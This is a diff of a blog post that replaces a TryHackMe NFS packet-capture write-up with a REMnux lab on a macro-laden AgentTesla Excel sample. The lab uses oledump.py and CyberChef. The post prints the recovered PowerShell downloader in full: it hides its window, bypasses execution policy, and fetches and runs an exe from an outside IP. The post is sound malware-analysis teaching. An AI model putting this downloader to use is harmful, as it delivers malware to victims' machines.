@@ -1,95 +1,130 @@
 ---
-title: 'TryHackMe: Stolen Mount'
+title: "TryHackMe: REMnux Getting Started - Task 3 File Analysis"
 author: Dustin Merritt
 categories: [TryHackMe]
-tags: [nfs, wireshark, pcap, forensics]
+tags: [remnux, oledump, malware, vba, static analysis, cyberchef]
 render_with_liquid: false
-media_subpath: /images/tryhackme_stolenmount/
+media_subpath: /images/tryhackme_remnux/
 image:
-  path: room_card.webp
----  
-**Room Link**: https://tryhackme.com/room/hfb1stolenmount
+  path: room_image.webp
+---
 
-## Scenario
+In this TryHackMe room, we used **REMnux** to analyze a suspicious Excel document named `agenttesla.xlsm`. We leveraged the `oledump.py` tool to extract and examine embedded macros, then used **CyberChef** to clean and interpret an obfuscated PowerShell payload. This exercise demonstrated a realistic scenario where VBA macros are used to drop malware onto a target system.
 
-An intruder has breached the internal network and targeted the NFS (Network File System) server where sensitive backup files are stored. A confidential secret was exfiltrated. The only trace left behind is a packet capture (`challenge.pcapng`). Our task is to analyze this PCAP and retrieve the stolen information.
+[![TryHackMe Room Link](room_image.webp){: width="300" height="300" .shadow}](https://tryhackme.com/room/remnuxgettingstarted){: .center }
 
-## Tools Used
-- Wireshark – To analyze network traffic
-- CrackStation.net – To crack the MD5 hash
-- imagetotext.info/qr-code-scanner – To extract the contents of the final QR code
+## Initial Setup
 
-## Step-by-Step Walkthrough
-
-### 1. Open the Packet Capture
-Opened the `challenge.pcapng` file using Wireshark.
+We started by opening the **REMnux VM** and navigating to the provided file path:
 
 ```bash
-wireshark ~/Desktop/challenge.pcapng
+cd /home/ubuntu/Desktop/tasks/agenttesla/
 ```
 
-### 2. Filter NFS Traffic
-Filtered the traffic by NFS (Network File System):
+Running `oledump.py` on `agenttesla.xlsm` revealed several streams, notably:
 
-![NFS Filter](wireshark_nfsfilter.webp){: width="700" }
-
-NFS is used to mount directories over the network and can expose sensitive data if misconfigured.
-
-### 3. Follow TCP Stream
-Browsed the filtered traffic and found a stream containing an MD5 hash and a label suggesting it's an archive password:
-
-```
-Archive Password: 90eb7723a657b6597100aafef171d9f2 (md5)
+```bash
+oledump.py agenttesla.xlsm
 ```
 
-![TCP Stream with MD5](wireshark_tcpstream.webp){: width="700" }
-
-### 4. Look for File Reads
-Searched for `ACCESS : Allowed` and `READ_PLUS` operations to find full file reads which can indicate file downloads over NFS.
-
-![Access Allowed Screenshot](wireshark_accessallowed.webp){: width="700" }
-
-### 5. Export File from PCAP
-Identified a file transfer in the traffic. Exported packet bytes as `secrets.zip` using:
-
-- Right-click on packet
-- Follow -> TCP Stream
-- Save raw bytes as `secrets.zip`
-
-![Exported Bytes](wireshark_exportbytes.webp){: width="700" }
-
-### 6. Crack the Password
-The zip file was password protected. Used [https://crackstation.net](https://crackstation.net) to crack the MD5 hash:
-
-![CrackStation MD5 Result](crackstation_md5password.webp){: width="700" }
-
-CrackStation revealed the password successfully.
-
-### 7. Extract the Zip File
-Extracted contents of `secrets.zip` using the cracked password:
-
-![Unzip Result](unzip_secrets.txt.webp){: width="700" }
-
-This extracted a QR code image.
-
-![QR Code from Archive](qrcode_secretspng.webp){: width="700" }
-
-### 8. Decode the
- QR Code
-Uploaded the QR code image to [https://imagetotext.info/qr-code-scanner](https://imagetotext.info/qr-code-scanner) to decode it. The decoded output revealed the final flag.
-
-![Decoded QR Flag](qrcodereader_flag.webp){: width="700" }
-
-## Flag
-
+Output:
 ```
-THM{REDACTED_FOR_WRITEUP}
+A: xl/vbaProject.bin
+ A1:       468 'PROJECT'
+ A2:        62 'PROJECTwm'
+ A3: m     169 'VBA/Sheet1'
+ A4: M     688 'VBA/ThisWorkbook'
+ A5:         7 'VBA/_VBA_PROJECT'
+ A6:       209 'VBA/dir'
 ```
 
-## Lessons Learned
+The stream labeled `A4` contains a **macro** (`M` flag), suggesting potential malicious behavior.
 
-- NFS traffic can expose sensitive files if not secured properly.
-- PCAPs are valuable forensic artifacts for breach investigation.
-- Weak hashes like MD5 can easily be cracked with online tools.
-- Wireshark can reconstruct transferred files from captured packets.
+## Macro Extraction
 
+We extracted the contents of the macro using:
+
+```bash
+oledump.py agenttesla.xlsm -s 4
+```
+
+This provided raw hex output, but it was difficult to interpret. To decode the VBA macro, we added the `--vbadecompress` flag:
+
+```bash
+oledump.py agenttesla.xlsm -s 4 --vbadecompress
+```
+
+The output revealed a familiar PowerShell obfuscation pattern using `*` and `^` as noise characters:
+
+```vb
+Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l* ... -Uri "http://193.203.203.67/rt/Doc-3737122pdf.exe" ..."
+```
+
+## PowerShell Deobfuscation with CyberChef
+
+To make the PowerShell command human-readable, we used **CyberChef**:
+
+- Apply two **Find/Replace** operations:
+  - Replace `*` with an empty string
+  - Replace `^` with an empty string
+
+> 🔽 **Insert screenshot of CyberChef here showing the Find/Replace steps and the cleaned PowerShell script**
+
+Once cleaned, the PowerShell command was clearly a downloader:
+
+```powershell
+powershell -WindowStyle hidden -executionpolicy bypass;
+$TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' } PassThru;
+Invoke-WebRequest -Uri "http://193.203.203.67/rt/Doc-3737122pdf.exe" -OutFile $TempFile;
+Start-Process $TempFile;
+```
+
+## What Does This Do?
+
+- **Hidden Window**: Avoid user suspicion
+- **Bypass Execution Policy**: Allow running potentially blocked scripts
+- **Download EXE**: Grab `Doc-3737122pdf.exe` from a suspicious IP
+- **Execute**: Run the file on the target machine
+
+This macro behavior is a classic example of **initial access malware delivery**, likely a variant of **AgentTesla**, a popular information stealer.
+
+## Bonus: Analyzing `possible_malicious.docx`
+
+We applied the same technique to `possible_malicious.docx`:
+
+```bash
+oledump.py possible_malicious.docx
+```
+
+Output:
+```
+... 16 data streams ...
+... macro present at stream 8 ...
+```
+
+Another suspicious macro! These steps could easily be repeated to investigate further.
+
+## Wrap-Up
+
+This TryHackMe challenge was a practical introduction to static malware analysis using REMnux. Tools like `oledump.py` and CyberChef make reverse-engineering obfuscated macros more accessible. Remember, even Excel files can be trojan horses — always analyze before opening!
+
+## Key Takeaways
+
+- **Tool used**: `oledump.py`
+- **Macro identified in stream**: `A4`
+- **PowerShell function for downloading files**: `Invoke-WebRequest`
+- **Downloaded file name**: `Doc-3737122pdf.exe`
+- **Downloaded location**: `$TempFile`
+
+---
+
+<style>
+.center img {
+  display:block;
+  margin-left:auto;
+  margin-right:auto;
+}
+.wrap pre{
+    white-space: pre-wrap;
+}
+</style>
